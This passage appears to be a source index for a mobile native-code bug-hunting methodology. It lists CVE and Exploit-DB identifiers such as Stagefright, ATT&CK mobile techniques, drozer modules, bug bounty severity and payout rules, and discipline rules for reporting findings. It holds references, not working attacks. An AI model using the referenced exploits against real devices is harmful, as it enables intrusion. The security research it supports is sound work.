  the Flutter MethodChannel and React Native `nativeModuleProxy` enumeration scripts; the libc-hooking
  pattern for native-side checks; drozer `app.package.native` / `scanner.misc.native` and its own stated
  false-negative limitation; Google ASI campaign CVE list.
- **Exploit-DB / CVE pattern mining** (`primary/exploitdb-cve-patterns.md`, `primary/mitre-attack-mobile.md`):
  CVE-2019-11932 (EDB 47515), CVE-2015-3864/CVE-2015-1538 (Stagefright, EDB 38226/38124/40436/39640),
  CVE-2016-3861 (EDB 40354), the LG parser set (EDB 41981/41982/41983, 42169/42171); ATT&CK T1575, T1658,
  T1404, T1623/T1623.001 (analytics AN1657/AN1741), T1631/T1631.001, T1625/T1625.001, T1407 with mitigation
  M1006 (API 29 native-code-from-internal-storage restriction), T1617.
- **Severity and programme economics** (`primary/bugcrowd-vrt-severity.md`, `primary/vrp-program-economics.md`,
  `data/bugcrowd-vrt-full.csv` release 2026-07-08): the P1 landing nodes and the P5 fallbacks; AOSP's own
  remote-vs-local ACE severity split; Google's mandatory-patch rule and "unreachable bugs" clause; Samsung's
  `dlopen` clause; TikTok's arbitrary-code-execution requirement; Meta's $300k / $120k / $20k ladder and
  interaction multipliers; the "CVE with no exploit" out-of-scope clauses at PayPal, Reddit, Grab,
  HackenProof and Basecamp.
- **Bug-hunting discipline corpus** (`secondary/claude-bughunter.md`): the layer-ordering trap adapted to the
  JNI boundary (D16-019); marker discipline adapted to poison-fill heap-disclosure proofs and the
  baseline-first check (D16-029); the body-diff rule applied to leaked output bytes; the Shell-Loop Ban and
  result counting for the per-`.so` sweeps (D16-008, D16-060); the multi-tool reproduction bar; the
  pre-severity gate against the Critical claim; retraction-appendix discipline and the do-not-retract-a-
  patched-finding rule; the evidence split of what to mask versus what to leave visible; and the chain-filing
  order (primitives first, consumer second, backfill the links).
- **Gap analyses** (`gaps-*.md`): USB host/accessory and BLE channels as fully attacker-controlled inputs
  into native parsers; the ExoPlayer/Media3 attacker-set media URL reaching a native demuxer; the
  surface-to-phase budget that places D16 in the P7-adjacent half-day and the time-box rule that keeps it
  from eating the chaining pass.
